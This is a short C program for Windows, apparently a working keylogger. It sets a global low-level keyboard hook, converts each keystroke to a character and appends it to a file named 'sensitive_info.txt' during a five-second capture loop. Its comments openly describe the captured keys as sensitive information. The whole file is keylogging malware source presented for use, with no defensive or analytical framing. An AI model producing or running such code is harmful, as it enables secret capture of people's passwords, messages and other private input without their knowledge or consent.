#include <Windows.h>
#include <stdio.h>

HHOOK hHook;
bool exit_program = false;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    /**
    * Keyboard hook procedure.
    *
    * This function is called whenever a keyboard event is detected. It performs the following tasks:
    * 1. Retrieves the pressed key.
    * 2. Opens a file to write the sensitive information.
    * 3. Writes the key to the file.
    *
    * @param nCode The hook code.
    * @param wParam The event type.
    * @param lParam A pointer to a KBDLLHOOKSTRUCT structure that contains details about the keyboard event.
    * @return The result of the next hook procedure in the hook chain.
    */

    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        WCHAR key[2];
        WORD scanCode = p->scanCode;
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        ToUnicode(p->vkCode, scanCode, keyboardState, key, 2, 0);
        HANDLE hFile;
        DWORD dwBytesWritten;

        // Open the file to write the sensitive information
        hFile = CreateFileA("sensitive_info.txt", GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            return 1;
        }
        SetFilePointer(hFile, 0, NULL, FILE_END);
        WriteFile(hFile, &key, sizeof(key), &dwBytesWritten, NULL);
        CloseHandle(hFile);
    }
    if (exit_program)
    {
        UnhookWindowsHookEx(hHook);
        return 1;
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}


int main() {
    /**
    * The main function of the program.
    *
    * This function sets up a keyboard hook and runs a loop for a specified duration. It performs the following tasks:
    * 1. Sets up the keyboard hook to capture keyboard events.
    * 2. Runs a loop for 5 seconds to capture keyboard events.
    *
    * @return An integer representing the exit status of the program.
    */

    // Set up the keyboard hook
    hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (hHook == NULL) {
        return 1;
    }

    // Calculate the end time of the program (5 seconds from now)
    DWORD start = GetTickCount();
    DWORD end = start + 5000;

    MSG msg;
    while (!exit_program) {
        if (GetTickCount() >= end) {
            exit_program = true;
        }
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    return 0;
}